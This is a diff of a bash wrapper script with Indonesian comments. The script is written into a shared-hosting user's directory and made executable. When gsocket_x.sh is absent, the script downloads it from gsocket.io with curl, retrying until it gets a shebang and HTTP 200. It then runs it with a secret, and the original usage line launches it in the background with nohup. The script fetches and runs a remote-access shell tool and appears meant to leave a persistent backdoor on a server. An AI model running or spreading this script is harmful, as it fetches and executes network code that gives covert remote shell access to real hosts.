@@ -1,30 +1,27 @@
+cat > /home/u720333187/script/wrapper.sh <<'WEOF'
 #!/usr/bin/env bash
-# ~/wrapper.sh
-# Wrapper yang:
-# - memastikan SECRET ada
-# - jika ~/gsocket_x.sh tidak ada, akan mencoba download + validasi (shebang + http 200)
-# - menjalankan ~/gsocket_x.sh dengan env APP_SECRET set
-#
-# Usage:
-# SECRET='rahasia123' nohup ~/wrapper.sh > /tmp/gsocket.log 2>&1 &
+# wrapper.sh (ditempatkan di /home/u720333187/script/)
+# Behavior:
+# - cek SECRET
+# - jika gsocket_x.sh belum ada di folder yang sama, download + validasi
+# - jalankan gsocket_x.sh dengan APP_SECRET dari SECRET
 
+# directory this script berada
+DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+OUT="$DIR/gsocket_x.sh"
 GS_URL="https://gsocket.io/x"
-OUT="$HOME/gsocket_x.sh"
 TRIES=8
 SLEEP=2
 
-# 1) cek SECRET
 if [[ -z "$SECRET" ]]; then
   echo "$(date +'%F %T') ERROR: SECRET unset" >&2
   exit 1
 fi
 
-# 2) fungsi download & validasi
 download_and_check() {
   local try=1
   while (( try <= TRIES )); do
     echo "$(date +'%F %T') Attempt $try: downloading $GS_URL ..."
-    # simpan body ke tmp file, capture http code
     tmpf="$(mktemp)"
     http_code="$(curl -sS -w "%{http_code}" -o "$tmpf" "$GS_URL" || echo "000")"
     if [[ "$http_code" == "200" ]] && head -n1 "$tmpf" | grep -qE '^#!'; then
@@ -41,7 +38,6 @@ download_and_check() {
   return 1
 }
 
-# 3) jika file belum ada, download
 if [[ ! -f "$OUT" ]]; then
   echo "$(date +'%F %T') $OUT not found — attempting to download..."
   if ! download_and_check; then
@@ -49,7 +45,6 @@ if [[ ! -f "$OUT" ]]; then
     exit 2
   fi
 else
-  # kalau sudah ada, pastikan executable & tampilan singkat isi
   chmod 700 "$OUT" 2>/dev/null || true
   echo "$(date +'%F %T') Found existing $OUT (size=$(stat -c%s "$OUT") bytes)"
   if ! head -n1 "$OUT" | grep -qE '^#!'; then
@@ -61,10 +56,12 @@ else
   fi
 fi
 
-# 4) export secret and exec script (replace current process)
 export APP_SECRET="$SECRET"
 echo "$(date +'%F %T') Executing $OUT ..."
 exec bash "$OUT"
-# exec should not return; if it does:
 echo "$(date +'%F %T') ERROR: exec returned" >&2
 exit 4
+WEOF
+
+# beri izin executable
+chmod +x /home/u720333187/script/wrapper.sh
